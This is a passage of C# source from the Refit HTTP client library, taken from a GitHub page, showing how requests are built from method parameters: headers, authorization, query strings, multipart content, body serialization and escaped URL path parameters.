 //if header collection, add to request headers if (restMethod.HeaderCollectionAt(i)) { if (param is IDictionary<string, string> headerCollection) { foreach (var header in headerCollection) { headersToAdd ??= new Dictionary<string, string?>(); headersToAdd[header.Key] = header.Value; } }
 isParameterMappedToRequest = true; }
 //if authorize, add to request headers with scheme if ( restMethod.AuthorizeParameterInfo != null && restMethod.AuthorizeParameterInfo.Item2 == i ) { headersToAdd ??= new Dictionary<string, string?>(); headersToAdd["Authorization"] = $"{restMethod.AuthorizeParameterInfo.Item1} {param}"; isParameterMappedToRequest = true; }
 //if property, add to populate into HttpRequestMessage.Properties if (restMethod.PropertyParameterMap.ContainsKey(i)) { isParameterMappedToRequest = true; }
 // ignore nulls and already processed parameters if (isParameterMappedToRequest || param == null) continue;
 // for anything that fell through to here, if this is not a multipart method add the parameter to the query string // or if is an object bound to the path add any non-path bound properties to query string // or if it's an object with a query attribute var queryAttribute = restMethod .ParameterInfoArray[i] .GetCustomAttribute<QueryAttribute>(); if ( !restMethod.IsMultipart || restMethod.ParameterMap.ContainsKey(i) && restMethod.ParameterMap[i].IsObjectPropertyParameter || queryAttribute != null ) { AddQueryParameters(restMethod, queryAttribute, param, queryParamsToAdd, i, parameterInfo); continue; }
 AddMultiPart(restMethod, i, param, multiPartContent); }
 AddHeadersToRequest(headersToAdd, ret);
 AddPropertiesToRequest(restMethod, ret, paramList);
 // NB: The URI methods in .NET are dumb. Also, we do this // UriBuilder business so that we preserve any hardcoded query // parameters as well as add the parameterized ones. var uri = new UriBuilder(new Uri(BaseUri, urlTarget)); ParseExistingQueryString(uri, queryParamsToAdd);
 if (queryParamsToAdd.Count != 0) { uri.Query = CreateQueryString(queryParamsToAdd);; } else { uri.Query = null; }
 ret.RequestUri = new Uri( uri.Uri.GetComponents(UriComponents.PathAndQuery, restMethod.QueryUriFormat), UriKind.Relative ); return ret; }; }
 string AddObjectParametersToUrl(RestMethodParameterInfo parameterInfo, object param, string urlTarget) { foreach (var propertyInfo in parameterInfo.ParameterProperties) { var propertyObject = propertyInfo.PropertyInfo.GetValue(param); urlTarget = Regex.Replace( urlTarget, "{" + propertyInfo.Name + "}", Uri.EscapeDataString( settings.UrlParameterFormatter.Format( propertyObject, propertyInfo.PropertyInfo, propertyInfo.PropertyInfo.PropertyType ) ?? string.Empty ), RegexOptions.IgnoreCase | RegexOptions.CultureInvariant ); }
 return urlTarget; }
 string AddValueParameterToUrl(RestMethodInfoInternal restMethod, RestMethodParameterInfo parameterMapValue, object param, int i, string urlTarget) { string pattern; string replacement; if (parameterMapValue.Type == ParameterType.RoundTripping) { pattern = $@"{{\\*\\*{parameterMapValue.Name}}}"; var paramValue = (string)param; replacement = string.Join( "/", paramValue .Split('/') .Select( s => Uri.EscapeDataString( settings.UrlParameterFormatter.Format( s, restMethod.ParameterInfoArray[i], restMethod.ParameterInfoArray[i].ParameterType ) ?? string.Empty ) ) ); } else { pattern = "{" + parameterMapValue.Name + "}"; replacement = Uri.EscapeDataString( settings.UrlParameterFormatter.Format( param, restMethod.ParameterInfoArray[i], restMethod.ParameterInfoArray[i].ParameterType ) ?? string.Empty ); }
 urlTarget = Regex.Replace( urlTarget, pattern, replacement, RegexOptions.IgnoreCase | RegexOptions.CultureInvariant ); return urlTarget; }
 void AddBodyToRequest(RestMethodInfoInternal restMethod, object param, HttpRequestMessage ret) { if (param is HttpContent httpContentParam) { ret.Content = httpContentParam; } else if (param is Stream streamParam) { ret.Content = new StreamContent(streamParam); } // Default sends raw strings else if ( restMethod.BodyParameterInfo!.Item1 == BodySerializationMethod.Default && param is string stringParam ) { ret.Content = new StringContent(stringParam); } else { switch (restMethod.BodyParameterInfo.Item1) { case BodySerializationMethod.UrlEncoded: ret.Content = param is string str ? (HttpContent) new StringContent( Uri.EscapeDataString(str), Encoding.UTF8, "application/x-www-form-urlencoded" ) : new FormUrlEncodedContent( new FormValueMultimap(param, settings) ); break; case BodySerializationMethod.Default:#pragma warning disable CS0618 // Type or member is obsolete case BodySerializationMethod.Json:#pragma warning restore CS0618 // Type or member is obsolete case BodySerializationMethod.Serialized: var content = serializer.ToHttpContent(param); switch (restMethod.BodyParameterInfo.Item2) { case false: ret.Content = new PushStreamContent(#pragma warning disable IDE1006 // Naming Styles async (stream, \_, \_\_) =>#pragma warning restore IDE1006 // Naming Styles { using (stream) { await content .CopyToAsync(stream) .ConfigureAwait(false); } }, content.Headers.ContentType ); break; case true: ret.Content = content; break; }
 break; } } }
 void AddQueryParameters(RestMethodInfoInternal restMethod, QueryAttribute? queryAttribute, object param, List<KeyValuePair<string, string?>> queryParamsToAdd, int i, RestMethodParameterInfo? parameterInfo) { var attr = queryAttribute ?? DefaultQueryAttribute; if (DoNotConvertToQueryMap(param)) { queryParamsToAdd.AddRange( ParseQueryParameter( param, restMethod.ParameterInfoArray[i], restMethod.QueryParameterMap[i], attr ) ); } else { foreach (var kvp in BuildQueryMap(param, attr.Delimiter, parameterInfo)) { var path = !string.IsNullOrWhiteSpace(attr.Prefix) ? $"{attr.Prefix}{attr.Delimiter}{kvp.Key}" : kvp.Key; queryParamsToAdd.AddRange( ParseQueryParameter( kvp.Value, restMethod.ParameterInfoArray[i], path, attr ) ); } } }
 void AddMultiPart(RestMethodInfoInternal restMethod, int i, object param, MultipartFormDataContent? multiPartContent) { // we are in a multipart method, add the part to the content // the parameter name should be either the attachment name or the parameter name (as fallback) string itemName; string parameterName;
 if (!restMethod.AttachmentNameMap.TryGetValue(i, out var attachment)) { itemName = restMethod.QueryParameterMap[i]; parameterName = itemName; } else { itemName = attachment.Item1; parameterName = attachment.Item2; }
 // Check to see if it's an IEnumerable if (param is IEnumerable<object> enumerable) { foreach (var item in enumerable!) { AddMultipartItem(multiPartContent!, itemName, parameterName, item); } } else { AddMultipartItem(multiPartContent!, itemName, parameterName, param); } }
 static void AddHeadersToRequest(Dictionary<string, string?>? headersToAdd, HttpRequestMessage ret) { // NB: We defer setting headers until the body has been // added so any custom content headers don't get left out. if (headersToAdd is null || headersToAdd.Count <= 0) return;
 // We could have content headers, so we need to make // sure we have an HttpContent object to add them to, // provided the HttpClient will allow it for the method if (ret.Content == null && !IsBodyless(ret.Method)) ret.Content = new ByteArrayContent(Array.Empty<byte>());
 foreach (var header in headersToAdd) { SetHeader(ret, header.Key, header.Value); } }
 void AddPropertiesToRequest(RestMethodInfoInternal restMethod, HttpRequestMessage ret, object[] paramList) { // Add RefitSetting.HttpRequestMessageOptions to the HttpRequestMessage if (settings.HttpRequestMessageOptions != null) { foreach (var p in settings.HttpRequestMessageOptions) {#if NET6\_0\_OR\_GREATER ret.Options.Set(new HttpRequestOptionsKey<object>(p.Key), p.Value);#else ret.Properties.Add(p);#endif } }
[View remainder of file in raw view](https://github.com/reactiveui/refit/raw/258a771f44417c6e48e103ac921fe4786f3c2a1e/Refit/RequestBuilderImplementation.cs)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


